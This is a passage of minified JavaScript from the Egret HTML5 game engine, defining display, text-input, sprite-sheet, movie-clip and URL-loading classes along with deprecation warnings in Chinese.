                    h + f._textureHeight > a && (a = h + f._textureHeight)
                }
            }
            this._textChanged = !1;
            return b.Rectangle.identity.initialize(0, 0,
                c, a)
        };
        a.prototype._measureBounds = function () {
            return this._renderText(!0)
        };
        return a
    }(b.DisplayObjectContainer);
    b.BitmapText = e;
    e.prototype.__class__ = "egret.BitmapText"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
            this._lastY = this._lastX = this._maxY = this._maxX = this._minY = this._minX = 0;
            this.commandQueue = []
        }

        b.prototype.beginFill = function (a, c) {
        };
        b.prototype._setStyle = function (a) {
        };
        b.prototype.drawRect = function (a, c, b, d) {
            this.checkRect(a, c, b, d)
        };
        b.prototype.drawCircle = function (a, c, b) {
            this.checkRect(a - b, c - b, 2 * b, 2 * b)
        };
        b.prototype.drawRoundRect = function (a, c, b, d, e, g) {
            this.checkRect(a, c, b, d)
        };
        b.prototype.drawEllipse = function (a, c, b, d) {
            this.checkRect(a - b, c - d, 2 * b, 2 * d)
        };
        b.prototype.lineStyle =
            function (a, c, b, d, e, g, f, h) {
            };
        b.prototype.lineTo = function (a, c) {
            this.checkPoint(a, c)
        };
        b.prototype.curveTo = function (a, c, b, d) {
            this.checkPoint(a, c);
            this.checkPoint(b, d)
        };
        b.prototype.moveTo = function (a, c) {
            this.checkPoint(a, c)
        };
        b.prototype.clear = function () {
            this._maxY = this._maxX = this._minY = this._minX = 0
        };
        b.prototype.endFill = function () {
        };
        b.prototype._draw = function (a) {
        };
        b.prototype.checkRect = function (a, c, b, d) {
            this._minX = Math.min(this._minX, a);
            this._minY = Math.min(this._minY, c);
            this._maxX = Math.max(this._maxX, a +
            b);
            this._maxY = Math.max(this._maxY, c + d)
        };
        b.prototype.checkPoint = function (a, c) {
            this._minX = Math.min(this._minX, a);
            this._minY = Math.min(this._minY, c);
            this._maxX = Math.max(this._maxX, a);
            this._maxY = Math.max(this._maxY, c);
            this._lastX = a;
            this._lastY = c
        };
        return b
    }();
    b.Graphics = e;
    e.prototype.__class__ = "egret.Graphics";
    (function () {
        return function (b, a, c) {
            this.method = b;
            this.thisObject = a;
            this.args = c
        }
    })()
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this)
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "graphics", {
            get: function () {
                this._graphics || (this._graphics = new b.Graphics);
                return this._graphics
            }, enumerable: !0, configurable: !0
        });
        a.prototype._render = function (c) {
            this._graphics && this._graphics._draw(c)
        };
        return a
    }(b.DisplayObject);
    b.Shape = e;
    e.prototype.__class__ = "egret.Shape"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this)
        }

        __extends(a, d);
        Object.defineProperty(a.prototype, "graphics", {
            get: function () {
                this._graphics || (this._graphics = new b.Graphics);
                return this._graphics
            }, enumerable: !0, configurable: !0
        });
        a.prototype._render = function (c) {
            this._graphics && this._graphics._draw(c);
            d.prototype._render.call(this, c)
        };
        return a
    }(b.DisplayObjectContainer);
    b.Sprite = e;
    e.prototype.__class__ = "egret.Sprite"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._inputEnabled = !1;
            this._text = this._type = "";
            this._displayAsPassword = !1;
            this._fontFamily = a.default_fontFamily;
            this._size = 30;
            this._textColorString = "#FFFFFF";
            this._textColor = 16777215;
            this._strokeColorString = "#000000";
            this._stroke = this._strokeColor = 0;
            this._textAlign = "left";
            this._verticalAlign = "top";
            this._numLines = this._lineSpacing = 0;
            this._multiline = !1;
            this.measuredWidths = []
        }

        __extends(a, d);
        a.prototype.isInput = function () {
            return this._type == b.TextFieldType.INPUT
        };
        a.prototype._setTouchEnabled = function (c) {
            d.prototype._setTouchEnabled.call(this, c);
            this.isInput() && (this._inputEnabled = !0)
        };
        Object.defineProperty(a.prototype, "type", {
            get: function () {
                return this._type
            }, set: function (c) {
                this._setType(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setType = function (c) {
            this._type != c && (this._type = c, this._type == b.TextFieldType.INPUT ? (null == this._inputUtils && (this._inputUtils = new b.InputController), this._inputUtils.init(this), this._setDirty(), this._stage && this._inputUtils._addStageText()) :
            this._inputUtils && (this._inputUtils._removeStageText(), this._inputUtils = null))
        };
        Object.defineProperty(a.prototype, "text", {
            get: function () {
                return this._getText()
            }, set: function (c) {
                this._setText(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._getText = function () {
            return this._multiline ? this._text : this._text.replace(/[\r\n]/g, "")
        };
        a.prototype._setTextDirty = function () {
            this._setSizeDirty()
        };
        a.prototype._setBaseText = function (c) {
            if (this._text != c || this._displayAsPassword) {
                this._setTextDirty();
                this._text = c;
                c =
                    "";
                if (this._displayAsPassword)for (var a = 0, b = this._text.length; a < b; a++)switch (this._text.charAt(a)) {
                    case "\n":
                        c += "\n";
                        break;
                    case "\r":
                        break;
                    default:
                        c += "*"
                } else c = this._text;
                this._drawText = c
            }
        };
        a.prototype._setText = function (c) {
            this._setBaseText(c);
            this._inputUtils && this._inputUtils._setText(this._text)
        };
        Object.defineProperty(a.prototype, "displayAsPassword", {
            get: function () {
                return this._displayAsPassword
            }, set: function (c) {
                this._setDisplayAsPassword(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setDisplayAsPassword =
            function (c) {
                this._displayAsPassword != c && (this._displayAsPassword = c, this._setText(this._text))
            };
        Object.defineProperty(a.prototype, "fontFamily", {
            get: function () {
                return this._fontFamily
            }, set: function (c) {
                this._setFontFamily(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setFontFamily = function (c) {
            this._fontFamily != c && (this._setTextDirty(), this._fontFamily = c)
        };
        Object.defineProperty(a.prototype, "size", {
            get: function () {
                return this._size
            }, set: function (c) {
                this._setSize(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setSize =
            function (c) {
                this._size != c && (this._setTextDirty(), this._size = c)
            };
        Object.defineProperty(a.prototype, "italic", {
            get: function () {
                return this._italic
            }, set: function (c) {
                this._setItalic(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setItalic = function (c) {
            this._italic != c && (this._setTextDirty(), this._italic = c)
        };
        Object.defineProperty(a.prototype, "bold", {
            get: function () {
                return this._bold
            }, set: function (c) {
                this._setBold(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setBold = function (c) {
            this._bold != c && (this._setTextDirty(),
                this._bold = c)
        };
        Object.defineProperty(a.prototype, "textColor", {
            get: function () {
                return this._textColor
            }, set: function (c) {
                this._setTextColor(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setTextColor = function (c) {
            this._textColor != c && (this._setTextDirty(), this._textColor = c, this._textColorString = b.toColorString(c))
        };
        Object.defineProperty(a.prototype, "strokeColor", {
            get: function () {
                return this._strokeColor
            }, set: function (c) {
                this._setStrokeColor(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setStrokeColor =
            function (c) {
                this._strokeColor != c && (this._setTextDirty(), this._strokeColor = c, this._strokeColorString = b.toColorString(c))
            };
        Object.defineProperty(a.prototype, "stroke", {
            get: function () {
                return this._stroke
            }, set: function (c) {
                this._setStroke(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setStroke = function (c) {
            this._stroke != c && (this._setTextDirty(), this._stroke = c)
        };
        Object.defineProperty(a.prototype, "textAlign", {
            get: function () {
                return this._textAlign
            }, set: function (c) {
                this._setTextAlign(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setTextAlign = function (c) {
            this._textAlign != c && (this._setTextDirty(), this._textAlign = c)
        };
        Object.defineProperty(a.prototype, "verticalAlign", {
            get: function () {
                return this._verticalAlign
            }, set: function (c) {
                this._setVerticalAlign(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setVerticalAlign = function (c) {
            this._verticalAlign != c && (this._setTextDirty(), this._verticalAlign = c)
        };
        Object.defineProperty(a.prototype, "maxScrollV", {
            get: function () {
                return this._numLines
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype,
            "selectionBeginIndex", {
                get: function () {
                    return 0
                }, enumerable: !0, configurable: !0
            });
        Object.defineProperty(a.prototype, "selectionEndIndex", {
            get: function () {
                return 0
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "caretIndex", {
            get: function () {
                return 0
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setSelection = function (c, a) {
        };
        Object.defineProperty(a.prototype, "lineSpacing", {
            get: function () {
                return this._lineSpacing
            }, set: function (c) {
                this._setLineSpacing(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setLineSpacing = function (c) {
            this._lineSpacing != c && (this._setTextDirty(), this._lineSpacing = c)
        };
        a.prototype._getLineHeight = function () {
            return this._lineSpacing + this._size
        };
        Object.defineProperty(a.prototype, "numLines", {
            get: function () {
                return this._numLines
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "multiline", {
            get: function () {
                return this._multiline
            }, set: function (c) {
                this._setMultiline(c)
            }, enumerable: !0, configurable: !0
        });
        a.prototype._setMultiline = function (c) {
            this._multiline =
                c;
            this._setDirty()
        };
        a.prototype.setFocus = function () {
            b.Logger.warning("TextField.setFocus \u6ca1\u6709\u5b9e\u73b0")
        };
        a.prototype._onRemoveFromStage = function () {
            d.prototype._onRemoveFromStage.call(this);
            this._type == b.TextFieldType.INPUT && this._inputUtils._removeStageText()
        };
        a.prototype._onAddToStage = function () {
            d.prototype._onAddToStage.call(this);
            this._type == b.TextFieldType.INPUT && this._inputUtils._addStageText()
        };
        a.prototype._updateBaseTransform = function () {
            d.prototype._updateTransform.call(this)
        };
        a.prototype._updateTransform = function () {
            this._type == b.TextFieldType.INPUT ? this._normalDirty ? (this._clearDirty(), this._inputUtils._updateProperties()) : this._inputUtils._updateTransform() : this._updateBaseTransform()
        };
        a.prototype._render = function (c) {
            this.drawText(c, !1);
            this._clearDirty()
        };
        a.prototype._measureBounds = function () {
            return this.drawText(b.MainContext.instance.rendererContext, !0)
        };
        a.prototype.drawText = function (c, a) {
            var d = this.getTextLines(c);
            if (!d)return this._textWidth = this._textHeight = this._numLines =
                0, b.Rectangle.identity.initialize(0, 0, 0, 0);
            var e = d.length;
            this._numLines = e;
            var g = 0.5 * this._size, f = this._size + this._lineSpacing, h = e * f - this._lineSpacing;
            this._textHeight = h;
            var p = this._hasHeightSet ? this._explicitHeight : Number.POSITIVE_INFINITY;
            if (this._hasHeightSet && h < p) {
                var m = 0;
                this._verticalAlign == b.VerticalAlign.MIDDLE ? m = 0.5 : this._verticalAlign == b.VerticalAlign.BOTTOM && (m = 1);
                g += m * (p - h)
            }
            g = Math.round(g);
            m = 0;
            this._textAlign == b.HorizontalAlign.CENTER ? m = 0.5 : this._textAlign == b.HorizontalAlign.RIGHT && (m =
                1);
            var q = this.measuredWidths, r;
            r = this._hasWidthSet ? this._explicitWidth : this._textWidth;
            for (var t = 0; t < e; t++) {
                var s = d[t], u = Math.round((r - q[t]) * m);
                !a && g < p && c.drawText(this, s, u, g, r);
                g += f
            }
            return b.Rectangle.identity.initialize(0, 0, r, h)
        };
        a.prototype.getTextLines = function (c) {
            var a = this._drawText ? this._drawText.toString() : "";
            if (!a)return null;
            var b = this.measuredWidths;
            b.length = 0;
            c.setupFont(this);
            var a = a.split(/(?:\r\n|\r|\n)/), d = a.length, e = 0;
            if (this._hasWidthSet)for (var f = this._explicitWidth, h = 0; h < d; h++) {
                var p =
                    a[h], m = c.measureText(p);
                if (m > f) {
                    for (var q = "", r = 0, t = p.length, s = 0; s < t; s++) {
                        var u = p.charAt(s), m = c.measureText(u);
                        r + m > f && (0 == r ? (a.splice(h, 0, u), b[h] = m, e < m && (e = m), m = 0, u = "") : (a.splice(h, 0, q), b[h] = r, e < r && (e = r), q = "", r = 0), h++, d++);
                        r += m;
                        q += u
                    }
                    a[h] = q;
                    b[h] = r
                } else b[h] = m, e < m && (e = m)
            } else for (h = 0; h < d; h++)p = a[h], m = c.measureText(p), b[h] = m, e < m && (e = m);
            this._textWidth = e;
            return a
        };
        a.default_fontFamily = "Arial";
        return a
    }(b.DisplayObject);
    b.TextField = e;
    e.prototype.__class__ = "egret.TextField"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.DYNAMIC = "dynamic";
        b.INPUT = "input";
        return b
    }();
    b.TextFieldType = e;
    e.prototype.__class__ = "egret.TextFieldType"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            d.call(this);
            var a = c.bitmapData;
            this.bitmapData = a;
            this._textureMap = {};
            this._sourceWidth = a.width;
            this._sourceHeight = a.height;
            this._bitmapX = c._bitmapX - c._offsetX;
            this._bitmapY = c._bitmapY - c._offsetY
        }

        __extends(a, d);
        a.prototype.getTexture = function (c) {
            return this._textureMap[c]
        };
        a.prototype.createTexture = function (c, a, d, e, g, f, h, p, m) {
            void 0 === f && (f = 0);
            void 0 === h && (h = 0);
            "undefined" === typeof p && (p = f + e);
            "undefined" === typeof m && (m = h + g);
            var q = new b.Texture;
            q._bitmapData =
                this.bitmapData;
            q._bitmapX = this._bitmapX + a;
            q._bitmapY = this._bitmapY + d;
            q._bitmapWidth = e;
            q._bitmapHeight = g;
            q._offsetX = f;
            q._offsetY = h;
            q._textureWidth = p;
            q._textureHeight = m;
            q._sourceWidth = this._sourceWidth;
            q._sourceHeight = this._sourceHeight;
            return this._textureMap[c] = q
        };
        return a
    }(b.HashObject);
    b.SpriteSheet = e;
    e.prototype.__class__ = "egret.SpriteSheet"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            b.Logger.warning("TextInput \u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528TextField\u4ee3\u66ff\uff0c\u5e76\u8bbe\u7f6etype\u4e3aTextFieldType.INPUT");
            this.type = b.TextFieldType.INPUT
        }

        __extends(a, d);
        a.prototype.setText = function (c) {
            b.Logger.warning("TextField.setText()\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528TextInput.text\u8bbe\u7f6e");
            this.text = c
        };
        a.prototype.getText = function () {
            b.Logger.warning("TextField.getText()\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528TextInput.text\u83b7\u53d6");
            return this.text
        };
        a.prototype.setTextType = function (c) {
            b.Logger.warning("TextField.setTextType()\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528TextInput.displayAsPassword\u8bbe\u7f6e");
            this.displayAsPassword = "password" == c
        };
        a.prototype.getTextType = function () {
            b.Logger.warning("TextField.getTextType()\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528TextInput.displayAsPassword\u83b7\u53d6");
            return this.displayAsPassword ? "password" : "text"
        };
        return a
    }(b.TextField);
    b.TextInput = e;
    e.prototype.__class__ = "egret.TextInput"
})(egret ||
(egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a() {
            d.call(this);
            this._isFocus = !1
        }

        __extends(a, d);
        a.prototype.init = function (c) {
            this._text = c;
            this.stageText = b.StageText.create();
            c = this._text.localToGlobal();
            this.stageText._open(c.x, c.y, this._text._explicitWidth, this._text._explicitHeight)
        };
        a.prototype._addStageText = function () {
            this._text._inputEnabled || (this._text._touchEnabled = !0);
            this.stageText._add();
            this.stageText._addListeners();
            this.stageText.addEventListener("blur", this.onBlurHandler, this);
            this.stageText.addEventListener("focus",
                this.onFocusHandler, this);
            this.stageText.addEventListener("updateText", this.updateTextHandler, this);
            this._text.addEventListener(b.TouchEvent.TOUCH_BEGIN, this.onMouseDownHandler, this);
            b.MainContext.instance.stage.addEventListener(b.TouchEvent.TOUCH_BEGIN, this.onStageDownHandler, this)
        };
        a.prototype._removeStageText = function () {
            this.stageText._remove();
            this.stageText._removeListeners();
            this._text._inputEnabled || (this._text._touchEnabled = !1);
            this.stageText.removeEventListener("blur", this.onBlurHandler,
                this);
            this.stageText.removeEventListener("focus", this.onFocusHandler, this);
            this.stageText.removeEventListener("updateText", this.updateTextHandler, this);
            this._text.removeEventListener(b.TouchEvent.TOUCH_BEGIN, this.onMouseDownHandler, this);
            b.MainContext.instance.stage.removeEventListener(b.TouchEvent.TOUCH_BEGIN, this.onStageDownHandler, this)
        };
        a.prototype._setText = function (c) {
            this.stageText._setText(c)
        };
        a.prototype.onFocusHandler = function (c) {
            this.hideText()
        };
        a.prototype.onBlurHandler = function (c) {
            this.showText()
        };
        a.prototype.onMouseDownHandler = function (c) {
            c.stopPropagation();
            this._text._visible && this.stageText._show()
        };
        a.prototype.onStageDownHandler = function (c) {
            this.stageText._hide();
            this.showText()
        };
        a.prototype.showText = function () {
            this._isFocus && (this._isFocus = !1, this.resetText())
        };
        a.prototype.hideText = function () {
            this._isFocus || (this._text.visible = !1, this._isFocus = !0)
        };
        a.prototype.updateTextHandler = function (c) {
            this.resetText()
        };
        a.prototype.resetText = function () {
            this._text.visible = !0;
            this._text._setBaseText(this.stageText._getText())
        };
        a.prototype._updateTransform = function () {
            var c = this._text._worldTransform.a, a = this._text._worldTransform.b, b = this._text._worldTransform.c, d = this._text._worldTransform.d, e = this._text._worldTransform.tx, f = this._text._worldTransform.ty;
            this._text._updateBaseTransform();
            var h = this._text._worldTransform;
            if (c != h.a || a != h.b || b != h.c || d != h.d || e != h.tx || f != h.ty)c = this._text.localToGlobal(), this.stageText.changePosition(c.x, c.y)
        };
        a.prototype._updateProperties = function () {
            var c = this._text._stage;
            if (null == c)this.stageText._setVisible(!1);
            else {
                for (var a = this._text, d = a._visible; d;) {
                    a = a.parent;
                    if (a == c)break;
                    d = a._visible
                }
                this.stageText._setVisible(d)
            }
            this.stageText._setMultiline(this._text._multiline);
            this.stageText._setSize(this._text._size);
            this.stageText._setTextColor(this._text._textColorString);
            this.stageText._setTextFontFamily(this._text._fontFamily);
            this.stageText._setBold(this._text._bold);
            this.stageText._setItalic(this._text._italic);
            this.stageText._setTextAlign(this._text._textAlign);
            this.stageText._setWidth(this._text._getSize(b.Rectangle.identity).width);
            this.stageText._setHeight(this._text._getSize(b.Rectangle.identity).height);
            this.stageText._setTextType(this._text._displayAsPassword ? "password" : "text");
            this.stageText._setText(this._text._text);
            this.stageText._resetStageText();
            this._updateTransform()
        };
        return a
    }(b.HashObject);
    b.InputController = e;
    e.prototype.__class__ = "egret.InputController"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(c, a) {
            b.call(this, c);
            this.charList = this.parseConfig(a)
        }

        __extends(a, b);
        a.prototype.getTexture = function (c) {
            var a = this._textureMap[c];
            if (!a) {
                a = this.charList[c];
                if (!a)return null;
                a = this.createTexture(c, a.x, a.y, a.width, a.height, a.offsetX, a.offsetY);
                this._textureMap[c] = a
            }
            return a
        };
        a.prototype.parseConfig = function (c) {
            c = c.split("\r\n").join("\n");
            c = c.split("\n");
            for (var a = this.getConfigByKey(c[3], "count"), b = {}, d = 4; d < 4 + a; d++) {
                var e = c[d], f = String.fromCharCode(this.getConfigByKey(e,
                    "id")), h = {};
                b[f] = h;
                h.x = this.getConfigByKey(e, "x");
                h.y = this.getConfigByKey(e, "y");
                h.width = this.getConfigByKey(e, "width");
                h.height = this.getConfigByKey(e, "height");
                h.offsetX = this.getConfigByKey(e, "xoffset");
                h.offsetY = this.getConfigByKey(e, "yoffset")
            }
            return b
        };
        a.prototype.getConfigByKey = function (c, a) {
            for (var b = c.split(" "), d = 0, e = b.length; d < e; d++) {
                var f = b[d];
                if (a == f.substring(0, a.length))return b = f.substring(a.length + 1), parseInt(b)
            }
            return 0
        };
        return a
    }(b.SpriteSheet);
    b.BitmapTextSpriteSheet = e;
    e.prototype.__class__ =
        "egret.BitmapTextSpriteSheet"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (a) {
        function c(c, e) {
            a.call(this);
            this.frameRate = 60;
            c instanceof d ? (b.Logger.warning("MovieClip#constructor\u63a5\u53e3\u53c2\u6570\u5df2\u7ecf\u53d8\u66f4\uff0c\u8bf7\u5c3d\u5feb\u8c03\u6574\u7528\u6cd5\u4e3a new MovieClip(data,texture)"), this.delegate = c) : this.delegate = new d(c, e);
            this.delegate.setMovieClip(this)
        }

        __extends(c, a);
        c.prototype.gotoAndPlay = function (c) {
            this.delegate.gotoAndPlay(c)
        };
        c.prototype.gotoAndStop = function (c) {
            this.delegate.gotoAndStop(c)
        };
        c.prototype.stop =
            function () {
                this.delegate.stop()
            };
        c.prototype.dispose = function () {
            this.delegate.dispose()
        };
        c.prototype.release = function () {
            b.Logger.warning("MovieClip#release\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
            this.dispose()
        };
        c.prototype.getCurrentFrameIndex = function () {
            b.Logger.warning("MovieClip#getCurrentFrameIndex\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
            return this.delegate._currentFrameIndex
        };
        c.prototype.getTotalFrame = function () {
            b.Logger.warning("MovieClip#getTotalFrame\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
            return this.delegate._totalFrame
        };
        c.prototype.setInterval = function (c) {
            b.Logger.warning("MovieClip#setInterval\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03,\u8bf7\u4f7f\u7528MovieClip#frameRate\u4ee3\u66ff");
            this.frameRate = 60 / c
        };
        c.prototype.getIsPlaying = function () {
            b.Logger.warning("MovieClip#getIsPlaying\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03");
            return this.delegate.isPlaying
        };
        return c
    }(b.DisplayObjectContainer);
    b.MovieClip = e;
    e.prototype.__class__ = "egret.MovieClip";
    var d = function () {
        function a(c, a) {
            this.data = c;
            this._currentFrameIndex = this._passTime =
                this._totalFrame = 0;
            this._isPlaying = !1;
            this._frameData = c;
            this._spriteSheet = new b.SpriteSheet(a)
        }

        a.prototype.setMovieClip = function (c) {
            this.movieClip = c;
            this.bitmap = new b.Bitmap;
            this.movieClip.addChild(this.bitmap)
        };
        a.prototype.gotoAndPlay = function (c) {
            this.checkHasFrame(c);
            this._isPlaying = !0;
            this._currentFrameIndex = 0;
            this._currentFrameName = c;
            this._totalFrame = this._frameData.frames[c].totalFrame;
            this.playNextFrame();
            this._passTime = 0;
            b.Ticker.getInstance().register(this.update, this)
        };
        a.prototype.gotoAndStop =
            function (c) {
                this.checkHasFrame(c);
                this.stop();
                this._currentFrameIndex = this._passTime = 0;
                this._currentFrameName = c;
                this._totalFrame = this._frameData.frames[c].totalFrame;
                this.playNextFrame()
            };
        a.prototype.stop = function () {
            this._isPlaying = !1;
            b.Ticker.getInstance().unregister(this.update, this)
        };
        a.prototype.dispose = function () {
        };
        a.prototype.checkHasFrame = function (c) {
            void 0 == this._frameData.frames[c] && b.Logger.fatal("MovieClip\u6ca1\u6709\u5bf9\u5e94\u7684frame\uff1a", c)
        };
        a.prototype.update = function (c) {
            for (var a =
                1E3 / this.movieClip.frameRate, a = Math.floor((this._passTime % a + c) / a); 1 <= a;)1 == a ? this.playNextFrame() : this.playNextFrame(!1), a--;
            this._passTime += c
        };
        a.prototype.playNextFrame = function (c) {
            void 0 === c && (c = !0);
            var a = this._frameData.frames[this._currentFrameName].childrenFrame[this._currentFrameIndex];
            if (c) {
                c = this.getTexture(a.res);
                var d = this.bitmap;
                d.x = a.x;
                d.y = a.y;
                d.texture = c
            }
            null != a.action && this.movieClip.dispatchEventWith(a.action);
            this._currentFrameIndex++;
            this._currentFrameIndex == this._totalFrame && (this._currentFrameIndex =
                0, a.action != b.Event.COMPLETE && this.movieClip.dispatchEventWith(b.Event.COMPLETE))
        };
        a.prototype.getTexture = function (c) {
            var a = this._frameData.res[c], b = this._spriteSheet.getTexture(c);
            b || (b = this._spriteSheet.createTexture(c, a.x, a.y, a.w, a.h));
            return b
        };
        return a
    }();
    b.DefaultMovieClipDelegate = d;
    d.prototype.__class__ = "egret.DefaultMovieClipDelegate"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a() {
            b.call(this);
            this._multiline = !1;
            this._maxChars = 0;
            this._size = 30;
            this._color = "#FFFFFF";
            this._fontFamily = "Arial";
            this._italic = this._bold = !1;
            this._textAlign = "left";
            this._visible = !1
        }

        __extends(a, b);
        a.prototype._getText = function () {
            return null
        };
        a.prototype._setText = function (c) {
        };
        a.prototype._setTextType = function (c) {
        };
        a.prototype._getTextType = function () {
            return null
        };
        a.prototype._open = function (c, a, b, d) {
        };
        a.prototype._show = function () {
        };
        a.prototype._add = function () {
        };
        a.prototype._remove = function () {
        };
        a.prototype._hide = function () {
        };
        a.prototype._addListeners = function () {
        };
        a.prototype._removeListeners = function () {
        };
        a.prototype.changePosition = function (c, a) {
        };
        a.prototype._setSize = function (c) {
            this._size = c
        };
        a.prototype._setTextColor = function (c) {
            this._color = c
        };
        a.prototype._setTextFontFamily = function (c) {
            this._fontFamily = c
        };
        a.prototype._setBold = function (c) {
            this._bold = c
        };
        a.prototype._setItalic = function (c) {
            this._italic = c
        };
        a.prototype._setTextAlign = function (c) {
            this._textAlign =
                c
        };
        a.prototype._setVisible = function (c) {
            this._visible = c
        };
        a.prototype._setWidth = function (c) {
        };
        a.prototype._setHeight = function (c) {
        };
        a.prototype._setMultiline = function (c) {
            this._multiline = c
        };
        a.prototype._resetStageText = function () {
        };
        a.create = function () {
            return null
        };
        return a
    }(b.EventDispatcher);
    b.StageText = e;
    e.prototype.__class__ = "egret.StageText"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.GET = "get";
        b.POST = "post";
        return b
    }();
    b.URLRequestMethod = e;
    e.prototype.__class__ = "egret.URLRequestMethod"
})(egret || (egret = {}));
(function (b) {
    var e = function () {
        function b() {
        }

        b.BINARY = "binary";
        b.TEXT = "text";
        b.VARIABLES = "variables";
        b.TEXTURE = "texture";
        b.SOUND = "sound";
        return b
    }();
    b.URLLoaderDataFormat = e;
    e.prototype.__class__ = "egret.URLLoaderDataFormat"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (b) {
        function a(c) {
            void 0 === c && (c = null);
            b.call(this);
            null !== c && this.decode(c)
        }

        __extends(a, b);
        a.prototype.decode = function (c) {
            this.variables || (this.variables = {});
            c = c.split("+").join(" ");
            for (var a, b = /[?&]?([^=]+)=([^&]*)/g; a = b.exec(c);)this.variables[decodeURIComponent(a[1])] = decodeURIComponent(a[2])
        };
        a.prototype.toString = function () {
            if (!this.variables)return "";
            var c = this.variables, a = "", b = !0, d;
            for (d in c)b ? b = !1 : a += "&", a += d + "=" + c[d];
            return a
        };
        return a
    }(b.HashObject);
    b.URLVariables =
        e;
    e.prototype.__class__ = "egret.URLVariables"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            void 0 === c && (c = null);
            d.call(this);
            this.method = b.URLRequestMethod.GET;
            this.url = c
        }

        __extends(a, d);
        return a
    }(b.HashObject);
    b.URLRequest = e;
    e.prototype.__class__ = "egret.URLRequest"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

    for (var a in e)e.hasOwnProperty(a) && (b[a] = e[a]);
    d.prototype = e.prototype;
    b.prototype = new d
};
(function (b) {
    var e = function (d) {
        function a(c) {
            void 0 === c && (c = null);
            d.call(this);
            this.dataFormat = b.URLLoaderDataFormat.TEXT;
            this._status = -1;
            c && this.load(c)
        }

        __extends(a, d);
        a.prototype.load = function (c) {
            this._request = c;
            this.data = null;
            b.MainContext.instance.netContext.proceed(this)
        };
        return a
    }(b.EventDispatcher);
    b.URLLoader = e;
    e.prototype.__class__ = "egret.URLLoader"
})(egret || (egret = {}));
__extends = this.__extends || function (b, e) {
    function d() {
        this.constructor = b
    }

